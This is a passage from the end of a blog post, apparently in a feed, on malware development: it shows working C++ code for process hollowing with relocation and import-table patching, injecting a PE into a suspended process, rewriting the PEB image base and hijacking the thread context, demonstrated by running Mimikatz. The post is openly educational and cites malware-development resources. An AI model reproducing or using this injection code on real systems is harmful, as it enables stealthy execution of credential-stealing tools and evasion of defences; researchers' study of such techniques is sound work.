+    <span class="n">LPVOID</span> <span class="n">allocAddrOnTarget</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">allocAddrOnTarget</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">peInjectNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">SizeOfImage</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
+    <span class="n">DWORD64</span> <span class="n">DeltaImageBase</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">allocAddrOnTarget</span> <span class="o">-</span> <span class="n">peInjectNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">ImageBase</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">allocAddrOnTarget</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">_dbg</span><span class="p">(</span><span class="s">"[-] ERROR: Failed to allocate memory on target process</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] Memory allocate at : 0x%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">allocAddrOnTarget</span><span class="p">);</span>
+
+    <span class="n">IMAGE_DATA_DIRECTORY</span> <span class="n">relocationTable</span> <span class="o">=</span> <span class="n">peInjectNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">DataDirectory</span><span class="p">[</span><span class="n">IMAGE_DIRECTORY_ENTRY_BASERELOC</span><span class="p">];</span>
+    <span class="n">PIMAGE_SECTION_HEADER</span> <span class="n">peToInjectRelocSection</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+    <span class="n">DWORD</span> <span class="n">offsetRdata</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">copyPEinTargetProcess</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">peToInjectContent</span><span class="p">,</span> <span class="n">peInjectNtHeaders</span><span class="p">,</span> <span class="n">peToInjectRelocSection</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">offsetRdata</span><span class="p">))</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fixRelocTable</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">peToInjectRelocSection</span><span class="p">,</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">peToInjectContent</span><span class="p">,</span> <span class="n">DeltaImageBase</span><span class="p">,</span> <span class="n">relocationTable</span><span class="p">))</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">loadImportTableLibs</span><span class="p">(</span><span class="n">peToInjectContent</span><span class="p">,</span> <span class="n">peInjectNtHeaders</span><span class="p">,</span> <span class="n">pi</span><span class="p">,</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">offsetRdata</span><span class="p">))</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+
+
+    <span class="n">HANDLE</span> <span class="n">mod</span> <span class="o">=</span> <span class="n">getSnapShotProcess</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">dwProcessId</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fixImports</span><span class="p">(</span><span class="n">peToInjectContent</span><span class="p">,</span> <span class="n">peInjectNtHeaders</span><span class="p">,</span> <span class="n">pi</span><span class="p">,</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">offsetRdata</span><span class="p">,</span> <span class="n">mod</span><span class="p">))</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    
+    <span class="n">CONTEXT</span> <span class="n">CTX</span> <span class="o">=</span> <span class="p">{};</span>
+    <span class="n">CTX</span><span class="p">.</span><span class="n">ContextFlags</span> <span class="o">=</span> <span class="n">CONTEXT_FULL</span><span class="p">;</span>
+
+    <span class="k">const</span> <span class="n">BOOL</span> <span class="n">bGetContext</span> <span class="o">=</span> <span class="n">GetThreadContext</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">CTX</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bGetContext</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">_dbg</span><span class="p">(</span><span class="s">"[-] An error is occured when trying to get the thread context.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">const</span> <span class="n">BOOL</span> <span class="n">bWritePEB</span> <span class="o">=</span> <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hProcess</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)(</span><span class="n">CTX</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">peInjectNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">ImageBase</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD64</span><span class="p">),</span> <span class="nb">nullptr</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bWritePEB</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">_dbg</span><span class="p">(</span><span class="s">"[-] An error is occured when trying to write the image base in the PEB.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">CTX</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">allocAddrOnTarget</span> <span class="o">+</span> <span class="n">peInjectNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">AddressOfEntryPoint</span><span class="p">;</span>
+
+    <span class="k">const</span> <span class="n">BOOL</span> <span class="n">bSetContext</span> <span class="o">=</span> <span class="n">SetThreadContext</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">CTX</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSetContext</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">_dbg</span><span class="p">(</span><span class="s">"[-] An error is occured when trying to set the thread context.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">ResumeThread</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hThread</span><span class="p">);</span>
+    
+    <span class="n">retrieveOutput</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hThread</span><span class="p">,</span> <span class="n">hStdOut</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p><img src="assets/img/posts/20240124/mimikatzRunning.png" alt="Mimikatz successfuly running" /></p>
+
+<p>We finally have a fully PE runner in a remote process and we can retrieve the output.</p>
+
+<h2 id="plot-twist">Plot Twist</h2>
+
+<p>Recently <a href="https://maldevacademy.com/new/modules/38">maldev academy</a> published an update where they also perform process hollowing. However by reading it, I realized that if we copy our PE at its prefered image base address contained in its NT Header, we do not need to perform relocation nor IAT patching.</p>
+
+<p>However, this technic allows to learn more about how the libraries are loaded in a process. Also, by using this technic, you can only copy the PE sections without the headers (header stomping). And you can avoid memory pages overlap by not forcing the address of the allocation.</p>
+
+<p>Hope you enjoyed it and learned something in this <del>too</del> long blog post.</p>
+
+<h2 id="references">References</h2>
+
+<ul>
+  <li><a href="https://www.ired.team">ired.team</a> that allowed me to learn about basic process hollowing</li>
+  <li><a href="https://maldevacademy.com/">maldev academy</a> that allowed me to learn about API Set names</li>
+  <li><a href="https://github.com/HavocFramework/Havoc">Havoc source code</a> that allowed me to learn more about forwarded functions</li>
+  <li><a href="https://0xrick.github.io/win-internals/pe1/">0xrick blog</a> that allowed me to learn more about PE format</li>
+  <li><a href="https://www.geoffchappell.com/index.htm">Geoff Chappell website</a> that allowed me to have a better understanding about Windows internal structures</li>
+  <li><a href="https://ntdoc.m417z.com/">m417z Native API documentation</a> that allowed me to access definition of Native Windows C structures</li>
+</ul>]]></content><author><name>ZkClown</name></author><category term="Code injection" /><category term="Coding" /><category term="Malware Developpement" /><category term="Windows" /><summary type="html"><![CDATA[A blog post to explain how we can perform process hollowing with IAT patching.]]></summary></entry></feed>
